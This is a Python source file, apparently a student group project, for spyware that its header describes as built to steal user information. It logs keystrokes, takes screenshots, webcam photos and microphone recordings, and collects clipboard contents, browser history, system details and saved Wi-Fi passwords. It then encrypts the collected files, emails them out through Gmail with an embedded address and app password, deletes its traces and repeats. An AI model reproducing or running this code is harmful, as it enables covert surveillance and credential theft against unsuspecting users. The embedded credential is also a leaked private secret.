
# /*
#  * Author: Group 10 : Gia Bao - Hoang Son - Duy Doan - The Anh
#  *
#  * Description: xay dung code co chuc nang trom thong tin ng dung bang python ! tool pycharm
#  */
import json
import logging
import os
import re
import shutil
import smtplib
import socket
import sys
import time
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from multiprocessing import Process
from pathlib import Path
from subprocess import CalledProcessError, check_output, Popen, TimeoutExpired
from threading import Thread
# External Modules #
import browserhistory as bh
import cv2
import requests
import sounddevice
from cryptography.fernet import Fernet
from PIL import ImageGrab
from pynput.keyboard import Listener

# Nếu hệ điều hành là Windows #
if os.name == 'nt':
    import win32clipboard
#     thuong cai pip  install pywin32 , phai chu dung den venv


def smtp_handler(email_address: str, password: str, email: MIMEMultipart):
    # /*
    #  * Author: Group 10 : Gia Bao - Hoang Son - Duy Doan - The Anh
    #  */
    """
     Tạo điều kiện thuận lợi cho việc gửi email có dữ liệu được mã hóa để lọc.

     :param email_address: Tài khoản Gmail được liên kết nơi dữ liệu được mã hóa sẽ được gửi.
     :param pass: Mật khẩu ứng dụng được tạo trong tài khoản Google của người dùng Gmail
     :param email: Phiên bản email sẽ được gửi.
     :param email: nhớ tắt xác minh 2 bước cua gg de chob the dăng nhập và gửi code!

     """
    try:

        with smtplib.SMTP('smtp.gmail.com', 587) as session:

            session.starttls()
            # Đăng nhập vào tài khoản Gmail #
            session.login(email_address, password)
            # message = MIMEText('This is the body of the email.', 'plain')
            # message['Subject'] = 'This is the subject of the email'
            # message['From'] = 'tgbao312003@gmail.com'
            # message['To'] = 'giabaotran0301@gmail.com'
            # session.send_message(message)
            # Gửi email và thoát khỏi phiên làm việc#
            session.sendmail(email_address,email_address, email.as_string())


    # Checked : Nếu xảy ra lỗi liên quan đến SMTP hoặc socket #
    except smtplib.SMTPException as mail_err:
        print_err(f'Error occurred during email session: {mail_err}')
        logging.exception('Error occurred during email session: %s\n', mail_err)


def email_attach(path: Path, attach_file: str) -> MIMEBase:
    """
     Tạo đối tượng đính kèm email và trả về nó.

     :param path: Đường dẫn file chứa file cần đính kèm.
     :param attachment_file: Tên file cần đính kèm.
     :return: Phiên bản đính kèm email đã được điền.
     """
    # Tạo đối tượng đính kèm email #
    attach = MIMEBase('application', "octet-stream")
    attach_path = path / attach_file

    # Đặt nội dung tệp làm tải trọng đính kèm #
    with attach_path.open('rb') as attachment:
        attach.set_payload(attachment.read())

    # Mã hóa file đính kèm trong base64 #
    encoders.encode_base64(attach)
    # Add header to attachment object #
    attach.add_header('Content-Disposition', f'attachment;filename = {attach_file}')
    return attach


def email_header(message: MIMEMultipart, email_address: str) -> MIMEMultipart:
    """
     Định dạng tiêu đề email và thêm tin nhắn vào nội dung.

     :param message: Ví dụ về thông báo email.
     :param email_address: Tài khoản Gmail được liên kết nơi dữ liệu được mã hóa sẽ được gửi.
     :trở lại:
     """
    message['From'] = email_address
    message['To'] = email_address
    message['Subject'] = 'Success!!!'
    body = 'Mission is completed'
    message.attach(MIMEText(body, 'plain'))
    return message


def send_mail(path: Path, re_obj: object):
    """
     Tạo điều kiện gửi email theo kiểu phân đoạn dựa trên các kết quả phù hợp với biểu thức chính quy.

     :param path: Đường dẫn file chứa file đính kèm vào email.
     :param re_obj: Phiên bản biểu thức chính quy được biên dịch chứa các mẫu được biên dịch trước cho phần mở rộng tệp.

     """
    # Nhập  tk  google #
    email_address = 'tgbao312003@gmail.com'          # <--- Enter your email address
    password = 'zfsm rcti gffy xnai'               # <--- Enter email password
    # password = 'tgbao312003gmail'               # <--- Enter email password

    # Tạo đối tượng tin nhắn với văn bản và tệp đính kèm #
    msg = MIMEMultipart()
    # Định dạng tiêu đề email #
    email_header(msg, email_address)

    # Lặp qua các tập tin được truyền trong thư mục #
    for file in os.scandir(path):
        # Nếu mục hiện tại là thư mục #
        if file.is_dir():
            continue


        if re_obj.re_xml.match(file.name) or re_obj.re_txt.match(file.name) \
        or re_obj.re_png.match(file.name) or re_obj.re_jpg.match(file.name):
            # Biến tập tin thành tập tin đính kèm email #
            attachment = email_attach(path, file.name)
            # Đính kèm tập tin vào email #
            msg.attach(attachment)

        elif re_obj.re_audio.match(file.name):
            # Tạo đối tượng tin nhắn thay thế cho file wav #
            msg_alt = MIMEMultipart()

            email_header(msg_alt, email_address)

            attachment = email_attach(path, file.name)

            msg_alt.attach(attachment)

            smtp_handler(email_address, password, msg_alt)

    smtp_handler(email_address, password, msg)


def encrypt_data(files: list, export_path: Path):
    """
     Mã hóa tất cả dữ liệu tệp trong danh sách tham số của tệp sẽ được lọc.
     :param files: Danh sách các file cần mã hóa.
     :paramexport_path: Đường dẫn tệp chứa các tệp được mã hóa.
     :return: Không có gì
     """
    # In the python console type: from cryptography.fernet import Fernet ; then run the command
    # below to generate a key. This key needs to be added to the key variable below as
    # well as in the DecryptFile.py that should be kept on the exploiter's system. If either
    # is forgotten either encrypting or decrypting process will fail. #
    # Command -> Fernet.generate_key()

    from cryptography.fernet import Fernet;
    key = b'T2UnFbwxfVlnJ1PWbixcDSxJtpGToMKotsjR4wsSJpM='

    # Lặp lại các tập tin để được mã hóa #
    for file in files:

        file_path = export_path / file
        crypt_path = export_path / f'e_{file}'
        try:
            # Đọc dữ liệu văn bản thuần túy của tệp #
            with file_path.open('rb') as plain_text:
                data = plain_text.read()

            # Mã hóa dữ liệu tập tin #
            encrypted = Fernet(key).encrypt(data)

            # Ghi dữ liệu được mã hóa vào tập tin mới #
            with crypt_path.open('wb') as hidden_data:
                hidden_data.write(encrypted)

            # Xóa dữ liệu văn bản thuần túy #
            file_path.unlink()

        # Nếu xảy ra lỗi trong quá trình thao tác với tập tin #
        except OSError as file_err:
            print_err(f'Error occurred during file operation: {file_err}')
            logging.exception('Error occurred during file operation: %s\n', file_err)


class RegObject:

    def __init__(self):
        # Compile regex's for attaching files #
        self.re_xml = re.compile(r'.{1,255}\.xml$')
        self.re_txt = re.compile(r'.{1,255}\.txt$')
        self.re_png = re.compile(r'.{1,255}\.png$')
        self.re_jpg = re.compile(r'.{1,255}\.jpg$')
        # If the OS is Windows #
        if os.name == 'nt':
            self.re_audio = re.compile(r'.{1,255}\.wav$')
        # If the OS is Linux #
        else:
            self.re_audio = re.compile(r'.{1,255}\.mp4')


def webcam(webcam_path: Path):
    """
     Chụp ảnh webcam cứ 10 giây một lần.

     :param webcam_path: Đường dẫn tệp nơi hình ảnh webcam sẽ được lưu trữ.

     """
    # Tạo thư mục lưu trữ ảnh webcam #
    webcam_path.mkdir(parents=True, exist_ok=True)
    # Khởi tạo phiên bản quay video #
    cam = cv2.VideoCapture(0)

    for current in range(1, 11):
    # for current in range(1, 61):
        # Chụp ảnh chế độ xem webcam hiện tại #
        ret, img = cam.read()
        # Nếu ảnh đã được chụp #
        if ret:
            # Định dạng đường dẫn webcam đầu ra #
            file_path = webcam_path / f'{current}_webcam.jpg'
            # Lưu ảnh thành file #
            cv2.imwrite(str(file_path), img)

        # Quá trình ngắt 10 giây #
        time.sleep(5)

    cam.release()


def microphone(mic_path: Path):
    """
     Tích cực ghi âm micrô trong khoảng thời gian 60 giây.
     :param mic_path: Đường dẫn tệp nơi bản ghi micrô sẽ được lưu trữ.
     """

    from scipy.io.wavfile import write as write_rec
    # Đặt số khung hình mỗi giây và thời lượng ghi #
    frames_per_second = 44100
    seconds = 60

    for current in range(1, 6):
        #window#
        if os.name == 'nt':
            channel = 2
            rec_name = mic_path / f'{current}mic_recording.wav'
        # Linux #
        else:
            channel = 1
            rec_name = mic_path / f'{current}mic_recording.mp4'

        # Khởi tạo phiên bản để ghi micrô #
        my_recording = sounddevice.rec(int(seconds * frames_per_second),
                                       samplerate=frames_per_second, channels=channel)
        # Chờ khoảng thời gian để mic ghi âm #
        sounddevice.wait()

        # Lưu bản ghi ở định dạng phù hợp dựa trên OS #
        write_rec(str(rec_name), frames_per_second, my_recording)


def screenshot(screenshot_path: Path):
    """
     Chụp ảnh màn hình cứ sau năm giây.

     :param ảnh chụp màn hình_path: Đường dẫn tệp nơi ảnh chụp màn hình sẽ được lưu trữ.

     """

    screenshot_path.mkdir(parents=True, exist_ok=True)

    # for current in range(1, 61):
    for current in range(1, 11):
        pic = ImageGrab.grab()

        capture_path = screenshot_path / f'{current}_screenshot.png'

        pic.save(capture_path)

        time.sleep(5)


def log_keys(key_path: Path):
    """
     Phát hiện và ghi lại các phím được người dùng nhấn.
     :param key_path: Đường dẫn tệp nơi nhật ký phím được nhấn sẽ được lưu trữ.
     """
    # Đặt tệp nhật ký và định dạng #
    logging.basicConfig(filename=key_path, level=logging.DEBUG,
                        format='%(asctime)s: %(message)s')
    # Tham gia chuỗi trình nghe gõ phím #
    with Listener(on_press=lambda key: logging.info(str(key))) as listener:
        listener.join()


def get_browser_history(browser_file: Path):
    """
     Nhận tên người dùng trình duyệt, đường dẫn đến cơ sở dữ liệu trình duyệt và toàn bộ lịch sử trình duyệt.
     :param browser_file: Đường dẫn đến tệp đầu ra thông tin trình duyệt.
     """
    # Lấy tên người dùng của trình duyệt #
    bh_user = bh.get_username()
    # Lấy đường dẫn tới cơ sở dữ liệu của trình duyệt #
    db_path = bh.get_database_paths()
    # Truy xuất lịch sử người dùng #
    hist = bh.get_browserhistory()
    # Nối các kết quả vào một danh sách #
    browser_history = []
    browser_history.extend((bh_user, db_path, hist))

    try:
        # Ghi kết quả ra file đầu ra ở định dạng json #
        with browser_file.open('w', encoding='utf-8') as browser_txt:
            browser_txt.write(json.dumps(browser_history))

    # Nếu xảy ra lỗi trong quá trình thao tác với tập tin #
    except OSError as file_err:
        print_err(f'Error occurred during file operation: {file_err}')
        logging.exception('Error occurred during browser history file operation: %s\n', file_err)


def get_clipboard(export_path: Path):
    """
     Thu thập nội dung của clipboard và ghi kết quả đầu ra vào tệp đầu ra của clipboard.
     :paramexport_path: Đường dẫn tệp chứa dữ liệu được xuất.
     """
    try:
        # Truy cập bảng nhớ tạm #
        win32clipboard.OpenClipboard()
        # Sao chép dữ liệu clipboard #
        pasted_data = win32clipboard.GetClipboardData()

    # Nếu xảy ra lỗi khi lấy dữ liệu clipboard #
    except (OSError, TypeError):
        pasted_data = ''

    finally:
        # Đóng bảng nhớ tạm #
        win32clipboard.CloseClipboard()

    clip_path = export_path / 'clipboard_info.txt'
    try:
        # Ghi nội dung clipboard vào tập tin đầu ra #
        with clip_path.open('w', encoding='utf-8') as clipboard_info:
            clipboard_info.write(f'Clipboard Data:\n{"*" * 16}\n{pasted_data}')

    # Nếu xảy ra lỗi trong quá trình thao tác với tập tin #
    except OSError as file_err:
        print_err(f'Error occurred during file operation: {file_err}')
        logging.exception('Error occurred during file operation: %s\n', file_err)


def get_system_info(sysinfo_file: Path):
    """
     Chạy một loạt lệnh để thu thập thông tin hệ thống và phần cứng. Tất cả đầu ra là \
     được chuyển hướng đến tệp đầu ra thông tin hệ thống.
     :param sysinfo_file: Đường dẫn đến tệp đầu ra chứa thông tin hệ thống.
     """
    #  Windows #
    if os.name == 'nt':
        syntax = ['systeminfo', '&', 'tasklist', '&', 'sc', 'query']
    #  Linux #
    else:
        cmd0 = 'hostnamectl'
        cmd1 = 'lscpu'
        cmd2 = 'lsmem'
        cmd3 = 'lsusb'
        cmd4 = 'lspci'
        cmd5 = 'lshw'
        cmd6 = 'lsblk'
        cmd7 = 'df -h'

        syntax = f'{cmd0}; {cmd1}; {cmd2}; {cmd3}; {cmd4}; {cmd5}; {cmd6}; {cmd7}'

    try:
        # Thiết lập các lệnh thu thập thông tin hệ thống tiến trình con #
        with sysinfo_file.open('a', encoding='utf-8') as system_info:
            # Thiết lập các lệnh thu thập thông tin hệ thống tiến trình con #
            with Popen(syntax, stdout=system_info, stderr=system_info, shell=True) as get_sysinfo:
                # Thực thi tiến trình con #
                get_sysinfo.communicate(timeout=30)

    # Nếu xảy ra lỗi trong quá trình thao tác với tập tin #
    except OSError as file_err:
        print_err(f'Error occurred during file operation: {file_err}')
        logging.exception('Error occurred during file operation: %s\n', file_err)

    # Nếu xảy ra lỗi quá trình hoặc hết thời gian chờ #
    except TimeoutExpired:
        pass


def linux_wifi_query(export_path: Path):
    """
     Chạy các lệnh nmcli để truy vấn danh sách SSID Wi-Fi mà hệ thống đã gặp phải. SSID \
     danh sách sau đó được lặp lại từng dòng để truy vấn từng hồ sơ bao gồm mật khẩu. Tất cả \
     đầu ra được chuyển hướng đến tệp đầu ra thông tin Wi-Fi.
     :paramexport_path: Đường dẫn tệp chứa dữ liệu được xuất.
     """
    get_wifis = None
    170 / 5.000
    # Định dạng đường dẫn file đầu ra wifi #
    wifi_path = export_path / 'wifi_info.txt'

    try:
        # Nhận các mạng Wi-Fi khả dụng với nmcli #
        get_wifis = check_output(['nmcli', '-g', 'NAME', 'connection', 'show'])

    # Nếu xảy ra lỗi trong quá trình #
    except CalledProcessError as proc_err:
        logging.exception('Error occurred during Wi-Fi SSID list retrieval: %s\n', proc_err)

    # Nếu danh sách id SSID được truy xuất thành công #
    if get_wifis:
        # Lặp lại từng dòng kết quả lệnh #
        for wifi in get_wifis.split(b'\n'):
            # Nếu không phải là kết nối có dây #
            if b'Wired' not in wifi:
                try:
                    # Mở tệp danh sách SSID mạng ở chế độ ghi #
                    with wifi_path.open('w', encoding='utf-8') as wifi_list:
                        # Thiết lập tiến trình con lệnh kết nối wifi nmcli #
                        with Popen(f'nmcli -s connection show {wifi}', stdout=wifi_list,
                                   stderr=wifi_list, shell=True) as command:
                            # Thực thi tiến trình con #
                            command.communicate(timeout=60)

                # Nếu xảy ra lỗi trong quá trình thao tác với tập tin #
                except OSError as file_err:
                    print_err(f'Error occurred during file operation: {file_err}')
                    logging.exception('Error occurred during file operation: %s\n', file_err)

                # Nếu xảy ra lỗi quá trình hoặc hết thời gian chờ #
                except TimeoutExpired:
                    pass


def get_network_info(export_path: Path, network_file: Path):
    """
     Chạy một loạt lệnh để truy vấn thông tin mạng, chẳng hạn như cấu hình mạng, mật khẩu, \
     cấu hình ip, bảng arp, bảng định tuyến, cổng tcp/udp và cố gắng truy vấn ipify.org \
     API cho địa chỉ IP công cộng. Tất cả đầu ra được chuyển hướng đến tệp đầu ra thông tin mạng.
     :paramexport_path: Đường dẫn tệp chứa dữ liệu được xuất.
     :param network_file: Đường dẫn đến tệp nơi lưu trữ thông tin mạng đầu ra.
     """
    #  Windows #
    if os.name == 'nt':
        # Nhận thông tin mạng Wi-Fi đã lưu, cấu hình IP, bảng ARP,
        # Địa chỉ MAC, bảng định tuyến và các cổng TCP/UDP đang hoạt động #
        syntax = ['Netsh', 'WLAN', 'export', 'profile',
                  f'folder={str(export_path)}',
                  'key=clear', '&', 'ipconfig', '/all', '&', 'arp', '-a', '&',
                  'getmac', '-V', '&', 'route', 'print', '&', 'netstat', '-a']
    #  Linux #
    else:
        # Nhận thông tin mạng Wi-Fi #
        linux_wifi_query(export_path)
        cmd0 = 'ifconfig'
        cmd1 = 'arp -a'
        cmd2 = 'route'
        cmd3 = 'netstat -a'

        # Nhận cấu hình IP & địa chỉ MAC, bảng ARP,
        # bảng định tuyến và các cổng TCP/UDP đang hoạt động #
        syntax = f'{cmd0}; {cmd1}; {cmd2}; {cmd3}'

    try:
        # Mở tệp thông tin mạng ở chế độ ghi và tệp nhật ký file in write mode #
        with network_file.open('w', encoding='utf-8') as network_io:
            try:
                # Thiết lập các lệnh thu thập thông tin mạng tiến trình con #
                with Popen(syntax, stdout=network_io, stderr=network_io, shell=True) as commands:
                    # Thực thi tiến trình con #
                    commands.communicate(timeout=60)

            # Nếu hết thời gian thực thi #
            except TimeoutExpired:
                pass

            #  hostname #
            hostname = socket.gethostname()
            #  IP address  #
            ip_addr = socket.gethostbyname(hostname)

            try:
                # Truy vấn ipify API để lấy IP public #
                public_ip = requests.get('https://api.ipify.org').text

            # Nếu xảy ra lỗi khi truy vấn IP công cộng #
            except requests.ConnectionError as conn_err:
                public_ip = f'* Ipify connection failed: {conn_err} *'

            # Ghi lại địa chỉ IP công cộng và riêng tư #
            network_io.write(f'[!] Public IP Address: {public_ip}\n'
                             f'[!] Private IP Address: {ip_addr}\n')

    # Nếu xảy ra lỗi trong quá trình thao tác với tập tin #
    except OSError as file_err:
        print_err(f'Error occurred during file operation: {file_err}')
        logging.exception('Error occurred during file operation: %s\n', file_err)


def main():
    """
    Gathers network information, clipboard contents, browser history, initiates multiprocessing, \
    sends encrypted results, cleans up exfiltrated data, and loops back to the beginning.
    """
    #  Windows #
    if os.name == 'nt':
        export_path = Path('C:\\Tmp\\')
    # Linux #
    else:
        export_path = Path('/tmp/logs/')

    # Đảm bảo tồn tại thư mục lọc tmp #
    export_path.mkdir(parents=True, exist_ok=True)
    # Đặt tập tin và thư mục chương trình #
    network_file = export_path / 'network_info.txt'
    sysinfo_file = export_path / 'system_info.txt'
    browser_file = export_path / 'browser_info.txt'
    log_file = export_path / 'key_logs.txt'
    screenshot_dir = export_path / 'Screenshots'
    webcam_dir = export_path / 'WebcamPics'

    # Lấy thông tin mạng và lưu vào file đầu ra #
    get_network_info(export_path, network_file)

    # Lấy thông tin hệ thống và lưu vào file đầu ra #
    get_system_info(sysinfo_file)

    # Windows #
    if os.name == 'nt':
        # Lấy nội dung clipboard và lưu vào tập tin đầu ra #
        get_clipboard(export_path)

    # Lấy thông tin người dùng và lịch sử trình duyệt và lưu vào tập tin đầu ra #
    get_browser_history(browser_file)

    # Tạo và bắt đầu các tiến trình #
    proc_1 = Process(target=log_keys, args=(log_file,))
    proc_1.start()
    proc_2 = Thread(target=screenshot, args=(screenshot_dir,))
    proc_2.start()
    proc_3 = Thread(target=microphone, args=(export_path,))
    proc_3.start()
    proc_4 = Thread(target=webcam, args=(webcam_dir,))
    proc_4.start()

    # Tham gia các tiến trình/luồng với thời gian chờ là 5 phút #
    proc_1.join(timeout=300)
    proc_2.join(timeout=300)
    proc_3.join(timeout=300)
    proc_4.join(timeout=300)

    # Chấm dứt quá trình #
    proc_1.terminate()

    files = ['network_info.txt', 'system_info.txt', 'browser_info.txt', 'key_logs.txt']

    165 / 5.000
    # Khởi tạo phiên bản biểu thức chính quy đã biên dịch #
    regex_obj = RegObject()

    #  Windows #
    if os.name == 'nt':
        # Thêm tập tin clipboard vào danh sách #
        files.append('clipboard_info.txt')

        # Nối tệp vào danh sách tệp nếu mục là tệp và khớp với biểu thức chính quy xml #
        [files.append(file.name) for file in os.scandir(export_path)
         if regex_obj.re_xml.match(file.name)]
    #  Linux #
    else:
        files.append('wifi_info.txt')

    # Mã hóa tất cả các tập tin trong danh sách tập tin #
    encrypt_data(files, export_path)

    # Xuất dữ liệu qua email #
    send_mail(export_path, regex_obj)
    send_mail(screenshot_dir, regex_obj)
    send_mail(webcam_dir, regex_obj)

    # Dọn dẹp tập tin #
    shutil.rmtree(export_path)

    main()


def print_err(msg: str):
    """
    Displays the passed in error message via stderr.
    :param msg:  The error message to be displayed.
    """
    print(f'\n* [ERROR] {msg} *\n', file=sys.stderr)


if __name__ == '__main__':
    try:
        main()

    # Nếu phát hiện Ctrl + C #
    except KeyboardInterrupt:
        print('* Control-C entered...Program exiting *')

    # Nếu xảy ra ngoại lệ không xác định #
    except Exception as ex:
        print_err(f'Unknown exception occurred: {ex}')
        sys.exit(1)

    sys.exit(0)
